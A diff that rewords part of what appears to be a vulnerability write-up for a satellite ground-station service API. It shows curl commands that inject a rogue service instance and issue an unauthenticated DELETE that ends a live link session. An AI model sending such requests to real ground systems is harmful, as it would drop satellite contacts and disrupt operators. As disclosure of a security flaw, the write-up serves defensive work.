@@ -202,7 +202,8 @@ curl -s http://127.0.0.1:2048/api/sle-config/authentication-delay | jq .
 
 ### 4.3 Attempted: Inject a Rogue Service Instance
 
-Attempt to POST a fake service instance:
+In this section, we are going to attempt to POST a fake service instance.<br>
+Start by running the following:
 
 ```bash
 curl -i -X POST http://127.0.0.1:2048/api/service-instances \
@@ -229,13 +230,13 @@ sagr=1.spack=VST-PASS0001.rsl-fg=1.raf=onlt1
 sagr=1.spack=VST-PASS0001.fsl-fg=1.cltu=cltu1
 </pre>
 
-Issue an unauthenticated DELETE against one:
+Let's try to issue an unauthenticated `DELETE` request against one:
 
 ```bash
 curl -i -X DELETE "http://127.0.0.1:2048/api/service-instances/sagr=1.spack=VST-PASS0001.rsl-fg=1.raf=onlt1"
 ```
 
-Confirm it is gone:
+Now, confirm it is gone:
 
 ```bash
 curl -s http://127.0.0.1:2048/api/service-instances/ | jq .
@@ -243,6 +244,7 @@ curl -s http://127.0.0.1:2048/api/service-instances/ | jq .
 
 <img width="1375" height="200" alt="2026-03-19_12-22" src="https://github.com/user-attachments/assets/145d272f-edcc-4203-9b0f-ff1daec3738e" />
 
+It sure is! That means that we were successful.
 
 **Impact:** This is a **single-command availability attack**. A legitimate link session is terminated with no authentication required. In an operational environment this would drop a satellite contact.
 
